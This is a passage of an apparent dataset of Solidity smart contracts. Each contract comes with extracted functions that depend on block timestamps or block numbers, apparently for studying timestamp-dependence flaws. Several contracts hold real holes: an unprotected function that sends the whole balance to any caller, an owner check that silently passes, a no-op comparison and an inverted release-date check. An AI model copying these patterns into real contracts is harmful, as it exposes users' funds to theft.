{\n return completeDeliverable(_id, creator, brand);\n }\n return false;\n }\n function fulfillDeliverable(bytes32 _id) notExpired onlyCreator public returns (bool) {\n return _fulfill(_id);\n }\n function approveDeliverable(bytes32 _id) onlyBrand public returns (bool) {\n return _fulfill(_id);\n }\n function claim(bytes32 _id) external onlyCreator {\n claimableRewards[_id] = 0;\n }\n function lock() onlyBrand public {\n content.locked == true;\n locked = true;\n startTime = block.timestamp;\n }\n function extendExpiration(uint _expiration) onlyBrand public returns (bool) {\n require(_expiration > expiration && _expiration >= block.timestamp);\n expiration = _expiration;\n return true;\n }\n function destroy() onlyBrand expired public {\n selfdestruct(msg.sender);\n }\n function deposit() payable {}\n}\ncontract ERC20 {\n uint public totalSupply;\n function balanceOf(address who) constant returns (uint);\n function allowance(address owner, address spender) constant returns (uint);\n function transfer(address to, uint value) returns (bool ok);\n function transferFrom(address from, address to, uint value) returns (bool ok);\n function approve(address spender, uint value) returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0))\n owner = newOwner;\n }\n function kill() {\n if (msg.sender == owner)\n selfdestruct(owner);\n }\n modifier onlyOwner() {\n if (msg.sender == owner)\n _;\n }\n}\ncontract CCOIN is ERC20, Ownable {\n struct Escrow {\n address creator;\n address brand;\n address agreementContract;\n uint256 reward;\n }\n string public constant name = \"CCOIN\";\n string public constant symbol = \"CCOIN\";\n uint public constant decimals = 18;\n uint public totalSupply = 1000000000 * 10 ** 18;\n bool public locked;\n address public multisigETH;\n address public crowdSaleaddress;\n uint public ethReceived;\n uint public totalTokensSent;\n uint public startBlock;\n uint public endBlock;\n uint public maxCap;\n uint public minCap;\n uint public minContributionETH;\n uint public tokenPriceWei;\n uint firstPeriod;\n uint secondPeriod;\n uint thirdPeriod;\n uint fourthPeriod;\n uint fifthPeriod;\n uint firstBonus;\n uint secondBonus;\n uint thirdBonus;\n uint fourthBonus;\n uint fifthBonus;\n uint public multiplier;\n bool public stopInEmergency = false;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowed;\n mapping(address => Escrow) escrowAgreements;\n mapping(address => bool) public whitelisted;\n event Whitelist(address indexed participant);\n event Locked();\n event Unlocked();\n event StoppedCrowdsale();\n event RestartedCrowdsale();\n event Burned(uint256 value);\n modifier onlyUnlocked() {\n if (msg.sender != crowdSaleaddress && locked && msg.sender != owner)\n revert();\n _;\n }\n modifier onlyPayloadSize(uint numWords){\n assert(msg.data.length >= numWords * 32 + 4);\n _;\n }\n modifier onlyAuthorized() {\n if (msg.sender != crowdSaleaddress && msg.sender != owner)\n revert();\n _;\n }\n constructor() public {\n locked = true;\n multiplier = 10 ** 18;\n multisigETH = msg.sender;\n minContributionETH = 1;\n startBlock = 0;\n endBlock = 0;\n maxCap = 1000 * multiplier;\n tokenPriceWei = SafeMath.div(1, 1400);\n minCap = 100 * multiplier;\n totalTokensSent = 0;\n firstPeriod = 100;\n secondPeriod = 200;\n thirdPeriod = 300;\n fourthPeriod = 400;\n fifthPeriod = 500;\n firstBonus = 120;\n secondBonus = 115;\n thirdBonus = 110;\n fourthBonus = SafeMath.div(1075, 10);\n fifthBonus = 105;\n balances[multisigETH] = totalSupply;\n }\n function resetCrowdSaleaddress(address _newCrowdSaleaddress) public onlyAuthorized() {\n crowdSaleaddress = _newCrowdSaleaddress;\n }\n function unlock() public onlyAuthorized {\n locked = false;\n emit Unlocked();\n }\n function lock() public onlyAuthorized {\n locked = true;\n emit Locked();\n }\n function burn(address _member, uint256 _value) public onlyAuthorized returns (bool) {\n balances[_member] = SafeMath.sub(balances[_member], _value);\n totalSupply = SafeMath.sub(totalSupply, _value);\n emit Transfer(_member, 0x0, _value);\n emit Burned(_value);\n return true;\n }\n function Airdrop(address _to, uint256 _tokens) external onlyAuthorized returns(bool) {\n require(transfer(_to, _tokens));\n }\n function transfer(address _to, uint _value) public onlyUnlocked returns (bool) {\n balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);\n balances[_to] = SafeMath.add(balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyUnlocked returns (bool success) {\n if (balances[_from] < _value)\n revert();\n if (_value > allowed[_from][msg.sender])\n revert();\n balances[_from] = SafeMath.sub(balances[_from], _value);\n balances[_to] = SafeMath.add(balances[_to], _value);\n allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n function withdrawFromEscrow(address _agreementAddr, bytes32 _id) {\n require(balances[_agreementAddr] > 0);\n Agreement agreement = Agreement(_agreementAddr);\n require(agreement.creator() == msg.sender);\n uint256 reward = agreement.getClaimableRewards(_id);\n require(reward > 0);\n balances[_agreementAddr] = SafeMath.sub(balances[_agreementAddr], reward);\n balances[msg.sender] = SafeMath.add(balances[msg.sender], reward);\n }\n function WhitelistParticipant(address participant) external onlyAuthorized {\n whitelisted[participant] = true;\n emit Whitelist(participant);\n }\n function BlacklistParticipant(address participant) external onlyAuthorized {\n whitelisted[participant] = false;\n emit Whitelist(participant);\n }\n function() public payable onlyPayloadSize(2) {\n contribute(msg.sender);\n }\n function contribute(address _backer) internal returns (bool res) {\n if (msg.value < minContributionETH)\n revert();\n uint tokensToSend = calculateNoOfTokensToSend();\n if (SafeMath.add(totalTokensSent, tokensToSend) > maxCap)\n revert();\n if (!transfer(_backer, tokensToSend))\n revert();\n ethReceived = SafeMath.add(ethReceived, msg.value);\n totalTokensSent = SafeMath.add(totalTokensSent, tokensToSend);\n return true;\n }\n function calculateNoOfTokensToSend() constant internal returns (uint) {\n uint tokenAmount = SafeMath.div(SafeMath.mul(msg.value, multiplier), tokenPriceWei);\n if (block.number <= startBlock + firstPeriod)\n return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, firstBonus), 100);\n else if (block.number <= startBlock + secondPeriod)\n return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, secondBonus), 100);\n else if (block.number <= startBlock + thirdPeriod)\n return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, thirdBonus), 100);\n else if (block.number <= startBlock + fourthPeriod)\n return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fourthBonus), 100);\n else if (block.number <= startBlock + fifthPeriod)\n return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fifthBonus), 100);\n else\n return tokenAmount;\n }\n function stopCrowdsale() external onlyOwner{\n stopInEmergency = true;\n emit StoppedCrowdsale();\n }\n function restartCrowdsale() external onlyOwner{\n stopInEmergency = false;\n emit RestartedCrowdsale();\n }\n}",
  "extract_feature": [
    "function lock() onlyBrand public {\ncontent.locked == true;\nlocked = true;\nstartTime = block.timestamp;\n}",
    "function extendExpiration(uint _expiration) onlyBrand public returns (bool) {\nrequire(_expiration > expiration && _expiration >= block.timestamp);\nexpiration = _expiration;\nreturn true;\n}",
    "function calculateNoOfTokensToSend() constant internal returns (uint) {\nuint tokenAmount = SafeMath.div(SafeMath.mul(msg.value, multiplier), tokenPriceWei);\nif (block.number <= startBlock + firstPeriod)\nreturn tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, firstBonus), 100);\nelse if (block.number <= startBlock + secondPeriod)\nreturn tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, secondBonus), 100);\nelse if (block.number <= startBlock + thirdPeriod)\nreturn tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, thirdBonus), 100);\nelse if (block.number <= startBlock + fourthPeriod)\nreturn tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fourthBonus), 100);\nelse if (block.number <= startBlock + fifthPeriod)\nreturn tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fifthBonus), 100);\nelse\nreturn tokenAmount;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f54"
  },
  "filename": "8314.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ninterface TokenContract {\n function transfer(address _recipient, uint256 _amount) external returns (bool);\n function balanceOf(address _holder) external view returns (uint256);\n}\ncontract Vault is Ownable {\n TokenContract public tkn;\n uint256 public releaseDate;\n struct Member {\n address memberAddress;\n uint256 tokens;\n }\n Member[] public team;\n constructor() public {\n releaseDate = 1561426200;\n }\n function releaseTokens() onlyOwner public {\n require(releaseDate > block.timestamp);\n uint256 amount;\n for (uint256 i = 0; i < team.length; i++) {\n require(tkn.transfer(team[i].memberAddress, team[i].tokens));\n }\n amount = tkn.balanceOf(address(this));\n require(tkn.transfer(owner, amount));\n selfdestruct(owner);\n }\n function addMembers(address[] _member, uint256[] _tokens) onlyOwner public {\n require(_member.length > 0);\n require(_member.length == _tokens.length);\n Member memory member;\n for (uint256 i = 0; i < _member.length; i++) {\n member.memberAddress = _member[i];\n member.tokens = _tokens[i];\n team.push(member);\n }\n }\n}",
  "extract_feature": [
    "function releaseTokens() onlyOwner public {\nrequire(releaseDate > block.timestamp);\nuint256 amount;\nfor (uint256 i = 0; i < team.length; i++) {\nrequire(tkn.transfer(team[i].memberAddress, team[i].tokens));\n}\namount = tkn.balanceOf(address(this));\nrequire(tkn.transfer(owner, amount));\nselfdestruct(owner);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f55"
  },
  "filename": "8320.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract TokenCHK {\n function balanceOf(address _owner) public pure returns (uint256 balance) {}\n}\ncontract ESSENTIA_PE is Ownable {\n using SafeMath for uint256;\n string public name = \"ESSENTIA Public Engagement\";\n uint256 public tokenPrice = 0;\n uint256 public maxCap = 0;\n address public FWDaddrETH;\n address public ESSgenesis;\n uint256 public totalSold;\n uint256 public decimals = 18;\n mapping (address => uint256) public sold;\n uint256 public pubEnd = 0;\n address contractAddr=this;\n uint256 public tokenUnit = uint256(10)**decimals;\n TokenCHK essToken;\n constructor\n (\n address toETHaddr,\n address addrESSgenesis\n ) public {\n FWDaddrETH = toETHaddr;\n ESSgenesis = addrESSgenesis;\n essToken = TokenCHK(addrESSgenesis);\n }\n function () public payable {\n buy();\n }\n function setFWDaddrETH(address _value) public onlyOwner{\n FWDaddrETH=_value;\n }\n function setGenesis(address _value) public onlyOwner{\n ESSgenesis=_value;\n }\n function setMaxCap(uint256 _value) public onlyOwner{\n maxCap=_value;\n }\n function setPrice(uint256 _value) public onlyOwner{\n tokenPrice=_value;\n }\n function setPubEnd(uint256 _value) public onlyOwner{\n pubEnd=_value;\n }\n function buy() public payable {\n require(block.timestamp < pubEnd);\n require(msg.value > 0);\n require(msg.value + totalSold <= maxCap);\n uint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\n require(tokenAmount <= essToken.balanceOf(this));\n transferBuy(msg.sender, tokenAmount);\n totalSold = totalSold.add(msg.value);\n FWDaddrETH.transfer(msg.value);\n }\n function withdrawPUB() public returns(bool){\n require(block.timestamp > pubEnd);\n require(sold[msg.sender] > 0);\n if(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\n delete sold[msg.sender];\n return true;\n }\n function transferBuy(address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n sold[_to]=sold[_to].add(_value);\n return true;\n }\n function EMGwithdraw(uint256 weiValue) external onlyOwner {\n require(block.timestamp > pubEnd);\n require(weiValue > 0);\n FWDaddrETH.transfer(weiValue);\n }\n}",
  "extract_feature": [
    "function buy() public payable {\nrequire(block.timestamp < pubEnd);\nrequire(msg.value > 0);\nrequire(msg.value + totalSold <= maxCap);\nuint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\nrequire(tokenAmount <= essToken.balanceOf(this));\ntransferBuy(msg.sender, tokenAmount);\ntotalSold = totalSold.add(msg.value);\nFWDaddrETH.transfer(msg.value);\n}",
    "function withdrawPUB() public returns(bool){\nrequire(block.timestamp > pubEnd);\nrequire(sold[msg.sender] > 0);\nif(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\ndelete sold[msg.sender];\nreturn true;\n}",
    "function EMGwithdraw(uint256 weiValue) external onlyOwner {\nrequire(block.timestamp > pubEnd);\nrequire(weiValue > 0);\nFWDaddrETH.transfer(weiValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f56"
  },
  "filename": "8330.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.doSomething.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n function getAllMoneyOut() public {\n msg.sender.transfer(this.balance);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f57"
  },
  "filename": "8331.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.doSomething.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n function getAllMoneyOut() public {\n msg.sender.transfer(this.balance);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f58"
  },
  "filename": "8333.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.doSomething.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n function getAllMoneyOut() public {\n msg.sender.transfer(this.balance);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f59"
  },
  "filename": "8336.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.doSomething.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n msg.sender.transfer(msg.value);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\nmsg.sender.transfer(msg.value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5a"
  },
  "filename": "8337.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.doSomething.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n msg.sender.transfer(msg.value);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\nmsg.sender.transfer(msg.value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5b"
  },
  "filename": "8342.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n }\n function square(uint256 a) internal pure returns (uint256) {\n return mul(a, a);\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n }\n}\ncontract ERC20Interface {\n event Transfer(\n address indexed from,\n address indexed to,\n uint256 value\n );\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n function totalSupply() public view returns (uint256);\n function balanceOf(address _owner) public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value) public returns (bool);\n function allowance( address _owner, address _spender) public view returns (uint256);\n}\ncontract CHStock is ERC20Interface {\n using SafeMath for uint256;\n event RedeemShares(\n address indexed user,\n uint256 shares,\n uint256 dividends\n );\n string public name = \"ChickenHuntStock\";\n string public symbol = \"CHS\";\n uint8 public decimals = 18;\n uint256 public totalShares;\n uint256 public dividendsPerShare;\n uint256 public constant CORRECTION = 1 << 64;\n mapping (address => uint256) public ethereumBalance;\n mapping (address => uint256) internal shares;\n mapping (address => uint256) internal refund;\n mapping (address => uint256) internal deduction;\n mapping (address => mapping (address => uint256)) internal allowed;\n function redeemShares() public {\n uint256 _shares = shares[msg.sender];\n uint256 _dividends = dividendsOf(msg.sender);\n delete shares[msg.sender];\n delete refund[msg.sender];\n delete deduction[msg.sender];\n totalShares = totalShares.sub(_shares);\n ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_dividends);\n emit RedeemShares(msg.sender, _shares, _dividends);\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n _transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value)\n public\n returns (bool)\n {\n require(_value <= allowed[_from][msg.sender]);\n allowed[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function dividendsOf(address _shareholder) public view returns (uint256) {\n return dividendsPerShare.mul(shares[_shareholder]).add(refund[_shareholder]).sub(deduction[_shareholder]) / CORRECTION;\n }\n function totalSupply() public view returns (uint256) {\n return totalShares;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return shares[_owner];\n }\n function allowance(address _owner, address _spender)\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function _giveShares(address _user, uint256 _ethereum) internal {\n if (_ethereum > 0) {\n totalShares = totalShares.add(_ethereum);\n deduction[_user] = deduction[_user].add(dividendsPerShare.mul(_ethereum));\n shares[_user] = shares[_user].add(_ethereum);\n dividendsPerShare = dividendsPerShare.add(_ethereum.mul(CORRECTION) / totalShares);\n emit Transfer(address(0), _user, _ethereum);\n }\n }\n function _transfer(address _from, address _to, uint256 _value) internal {\n require(_to != address(0));\n require(_value <= shares[_from]);\n uint256 _rawProfit = dividendsPerShare.mul(_value);\n uint256 _refund = refund[_from].add(_rawProfit);\n uint256 _min = _refund < deduction[_from] ? _refund : deduction[_from];\n refund[_from] = _refund.sub(_min);\n deduction[_from] = deduction[_from].sub(_min);\n deduction[_to] = deduction[_to].add(_rawProfit);\n shares[_from] = shares[_from].sub(_value);\n shares[_to] = shares[_to].add(_value);\n emit Transfer(_from, _to, _value);\n }\n}\ncontract CHGameBase is CHStock {\n struct House {\n Hunter hunter;\n uint256 huntingPower;\n uint256 offensePower;\n uint256 defensePower;\n uint256 huntingMultiplier;\n uint256 offenseMultiplier;\n uint256 defenseMultiplier;\n uint256 depots;\n uint256[] pets;\n }\n struct Hunter {\n uint256 strength;\n uint256 dexterity;\n uint256 constitution;\n uint256 resistance;\n }\n struct Store {\n address owner;\n uint256 cut;\n uint256 cost;\n uint256 balance;\n }\n Store public store;\n uint256 public devCut;\n uint256 public devFee;\n uint256 public altarCut;\n uint256 public altarFund;\n uint256 public dividendRate;\n uint256 public totalChicken;\n address public chickenTokenDelegator;\n mapping (address => uint256) public lastSaveTime;\n mapping (address => uint256) public savedChickenOf;\n mapping (address => House) internal houses;\n function saveChickenOf(address _user) public returns (uint256) {\n uint256 _unclaimedChicken = _unclaimedChickenOf(_user);\n totalChicken = totalChicken.add(_unclaimedChicken);\n uint256 _chicken = savedChickenOf[_user].add(_unclaimedChicken);\n savedChickenOf[_user] = _chicken;\n lastSaveTime[_user] = block.timestamp;\n return _chicken;\n }\n function transferChickenFrom(address _from, address _to, uint256 _value)\n public\n returns (bool)\n {\n require(msg.sender == chickenTokenDelegator);\n require(saveChickenOf(_from) >= _value);\n savedChickenOf[_from] = savedChickenOf[_from] - _value;\n savedChickenOf[_to] = savedChickenOf[_to].add(_value);\n return true;\n }\n function chickenOf(address _user) public view returns (uint256) {\n return savedChickenOf[_user].add(_unclaimedChickenOf(_user));\n }\n function _payChicken(address _user, uint256 _chicken) internal {\n uint256 _unclaimedChicken = _unclaimedChickenOf(_user);\n uint256 _extraChicken;\n if (_chicken > _unclaimedChicken) {\n _extraChicken = _chicken - _unclaimedChicken;\n require(savedChickenOf[_user] >= _extraChicken);\n savedChickenOf[_user] -= _extraChicken;\n totalChicken -= _extraChicken;\n } else {\n _extraChicken = _unclaimedChicken - _chicken;\n totalChicken = totalChicken.add(_extraChicken);\n savedChickenOf[_user] += _extraChicken;\n }\n lastSaveTime[_user] = block.timestamp;\n }\n function _payEthereumAndDistribute(uint256 _cost) internal {\n require(_cost * 100 / 100 == _cost);\n _payEthereum(_cost);\n uint256 _toShareholders = _cost * dividendRate / 100;\n uint256 _toAltar = _cost * altarCut / 100;\n uint256 _toStore = _cost * store.cut / 100;\n devFee = devFee.add(_cost - _toShareholders - _toAltar - _toStore);\n _giveShares(msg.sender, _toShareholders);\n altarFund = altarFund.add(_toAltar);\n store.balance = store.balance.add(_toStore);\n }\n function _payEthereum(uint256 _cost) internal {\n uint256 _extra;\n if (_cost > msg.value) {\n _extra = _cost - msg.value;\n require(ethereumBalance[msg.sender] >= _extra);\n ethereumBalance[msg.sender] -= _extra;\n } else {\n _extra = msg.value - _cost;\n ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_extra);\n }\n }\n function _unclaimedChickenOf(address _user) internal view returns (uint256) {\n uint256 _timestamp = lastSaveTime[_user];\n if (_timestamp > 0 && _timestamp < block.timestamp) {\n return houses[_user].huntingPower.mul(\n houses[_user].huntingMultiplier\n ).mul(block.timestamp - _timestamp) / 100;\n } else {\n return 0;\n }\n }\n function _houseOf(address _user)\n internal\n view\n returns (House storage _house)\n {\n _house = houses[_user];\n require(_house.depots > 0);\n }\n}\ncontract CHHunter is CHGameBase {\n event UpgradeHunter(\n address indexed user,\n string attribute,\n uint256 to\n );\n struct Config {\n uint256 chicken;\n uint256 ethereum;\n uint256 max;\n }\n Config public typeA;\n Config public typeB;\n function upgradeStrength(uint256 _to) external payable {\n House storage _house = _houseOf(msg.sender);\n uint256 _from = _house.hunter.strength;\n require(typeA.max >= _to && _to > _from);\n _payForUpgrade(_from, _to, typeA);\n uint256 _increment = _house.hunter.dexterity.mul(2).add(8).mul(_to.square() - _from ** 2);\n _house.hunter.strength = _to;\n _house.huntingPower = _house.huntingPower.add(_increment);\n _house.offensePower = _house.offensePower.add(_increment);\n emit UpgradeHunter(msg.sender, \"strength\", _to);\n }\n function upgradeDexterity(uint256 _to) external payable {\n House storage _house = _houseOf(msg.sender);\n uint256 _from = _house.hunter.dexterity;\n require(typeB.max >= _to && _to > _from);\n _payForUpgrade(_from, _to, typeB);\n uint256 _increment = _house.hunter.strength.square().mul((_to - _from).mul(2));\n _house.hunter.dexterity = _to;\n _house.huntingPower = _house.huntingPower.add(_increment);\n _house.offensePower = _house.offensePower.add(_increment);\n emit UpgradeHunter(msg.sender, \"dexterity\", _to);\n }\n function upgradeConstitution(uint256 _to) external payable {\n House storage _house = _houseOf(msg.sender);\n uint256 _from = _house.hunter.constitution;\n require(typeA.max >= _to && _to > _from);\n _payForUpgrade(_from, _to, typeA);\n uint256 _increment = _house.hunter.resistance.mul(2).add(8).mul(_to.square() - _from ** 2);\n _house.hunter.constitution = _to;\n _house.defensePower = _house.defensePower.add(_increment);\n emit UpgradeHunter(msg.sender, \"constitution\", _to);\n }\n function upgradeResistance(uint256 _to) external payable {\n House storage _house = _houseOf(msg.sender);\n uint256 _from = _house.hunter.resistance;\n require(typeB.max >= _to && _to > _from);\n _payForUpgrade(_from, _to, typeB);\n uint256 _increment = _house.hunter.constitution.square().mul((_to - _from).mul(2));\n _house.hunter.resistance = _to;\n _house.defensePower = _house.defensePower.add(_increment);\n emit UpgradeHunter(msg.sender, \"resistance\", _to);\n }\n function _payForUpgrade(uint256 _from, uint256 _to, Config _type) internal {\n uint256 _chickenCost = _type.chicken.mul(_gapOfCubeSum(_from, _to));\n _payChicken(msg.sender, _chickenCost);\n uint256 _ethereumCost = _type.ethereum.mul(_gapOfSquareSum(_from, _to));\n _payEthereumAndDistribute(_ethereumCost);\n }\n function _gapOfSquareSum(uint256 _before, uint256 _after)\n internal\n pure\n returns (uint256)\n {\n return (_after * (_after - 1) * (2 * _after - 1) - _before * (_before - 1) * (2 * _before - 1)) / 6;\n }\n function _gapOfCubeSum(uint256 _before, uint256 _after)\n internal\n pure\n returns (uint256)\n {\n return ((_after * (_after - 1)) ** 2 - (_before * (_before - 1)) ** 2) >> 2;\n }\n}\ncontract CHHouse is CHHunter {\n event UpgradePet(\n address indexed user,\n uint256 id,\n uint256 to\n );\n event UpgradeDepot(\n address indexed user,\n uint256 to\n );\n event BuyItem(\n address indexed from,\n address indexed to,\n uint256 indexed id,\n uint256 cost\n );\n event BuyStore(\n address indexed from,\n address indexed to,\n uint256 cost\n );\n struct Pet {\n uint256 huntingPower;\n uint256 offensePower;\n uint256 defensePower;\n uint256 chicken;\n uint256 ethereum;\n uint256 max;\n }\n struct Item {\n address owner;\n uint256 huntingMultiplier;\n uint256 offenseMultiplier;\n uint256 defenseMultiplier;\n uint256 cost;\n }\n struct Depot {\n uint256 ethereum;\n uint256 max;\n }\n uint256 public constant INCREMENT_RATE = 12;\n Depot public depot;\n Pet[] public pets;\n Item[] public items;\n function buyDepots(uint256 _amount) external payable {\n House storage _house = _houseOf(msg.sender);\n _house.depots = _house.depots.add(_amount);\n require(_house.depots <= depot.max);\n _payEthereumAndDistribute(_amount.mul(depot.ethereum));\n emit UpgradeDepot(msg.sender, _house.depots);\n }\n function buyPets(uint256 _id, uint256 _amount) external payable {\n require(_id < pets.length);\n Pet memory _pet = pets[_id];\n uint256 _chickenCost = _amount * _pet.chicken;\n _payChicken(msg.sender, _chickenCost);\n uint256 _ethereumCost = _amount * _pet.ethereum;\n _payEthereumAndDistribute(_ethereumCost);\n House storage _house = _houseOf(msg.sender);\n if (_house.pets.length < _id + 1) {\n _house.pets.length = _id + 1;\n }\n _house.pets[_id] = _house.pets[_id].add(_amount);\n require(_house.pets[_id] <= _pet.max);\n _house.huntingPower = _house.huntingPower.add(_pet.huntingPower * _amount);\n _house.offensePower = _house.offensePower.add(_pet.offensePower * _amount);\n _house.defensePower = 